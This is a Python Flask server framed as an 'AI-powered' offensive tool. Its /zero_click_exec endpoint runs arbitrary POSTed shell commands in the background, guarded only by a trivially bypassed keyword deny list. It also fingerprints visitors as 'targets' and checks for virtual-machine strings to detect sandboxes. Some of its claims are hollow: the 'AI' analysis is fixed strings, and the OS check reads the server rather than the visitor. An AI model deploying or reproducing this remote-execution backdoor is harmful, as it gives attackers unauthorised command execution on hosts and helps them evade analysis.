from flask import Flask, request, jsonify
import os, platform, socket, base64, hashlib, json, random, time
from cryptography.fernet import Fernet
import threading
import subprocess
import psutil
from decouple import config
import requests

app = Flask(__name__)

# 🔐 Dynamic Encryption Key Generation
SECRET_KEY = base64.urlsafe_b64encode(hashlib.sha256(str(random.randint(1000,9999)).encode()).digest())
cipher = Fernet(SECRET_KEY)

# 🔥 AI-Powered Fingerprint & Behavioral Analysis
def generate_device_fingerprint(ip, user_agent):
    unique_id = hashlib.sha256(f"{ip}_{user_agent}_{random.randint(1000,9999)}".encode()).hexdigest()
    return unique_id

def ai_behavior_analysis(ip, os_info):
    if "Windows" in os_info:
        return "Target is likely using a corporate workstation. Proceed with stealth mode."
    elif "Linux" in os_info:
        return "Potential server environment detected. Adjusting approach..."
    return "Generic system detected. Running full analysis."

@app.route('/adaptive_scan', methods=['GET'])
def adaptive_scan():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    os_info = platform.system() + " " + platform.release()
    device_fingerprint = generate_device_fingerprint(user_ip, user_agent)
    ai_response = ai_behavior_analysis(user_ip, os_info)
    
    return jsonify({
        "Device Fingerprint": device_fingerprint,
        "IP": user_ip,
        "Device OS": os_info,
        "User-Agent": user_agent,
        "AI-Analysis": ai_response,
        "Encrypted Fingerprint": base64.b64encode(cipher.encrypt(device_fingerprint.encode())).decode()
    })

# 🚀 AI-Powered Execution (Self-Learning Exploits)
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        result = e.output
    return result

@app.route('/zero_click_exec', methods=['POST'])
def zero_click_exec():
    data = request.json
    command = data.get("command", "echo No Command")
    
    if any(x in command.lower() for x in ["danger", "rm -rf", "shutdown", "reboot", "del "]):
        return jsonify({"error": "Unauthorized Command"}), 403
    
    thread = threading.Thread(target=execute_command, args=(command,))
    thread.start()
    return jsonify({"status": "Executing in background"})

# 📊 AI-Based System Monitoring & Tracking
@app.route('/system_status', methods=['GET'])
def system_status():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    disk_usage = psutil.disk_usage('/')
    
    return jsonify({
        "CPU Usage": f"{cpu_usage}%",
        "Memory Usage": f"{memory_info.percent}%",
        "Disk Usage": f"{disk_usage.percent}%"
    })

# 🕵️‍♂️ Stealth Mode & Auto-Sandbox Detection
def detect_sandbox():
    sandbox_signals = ["VBOX", "VMWARE", "XEN", "PARALLELS"]
    system_info = platform.platform()
    for signal in sandbox_signals:
        if signal in system_info.upper():
            return True
    return False

@app.route('/sandbox_check', methods=['GET'])
def sandbox_check():
    sandbox_detected = detect_sandbox()
    return jsonify({"Sandbox Detected": sandbox_detected})

if __name__ == "__main__":
    app.run(debug=False, port=5000, threaded=True)
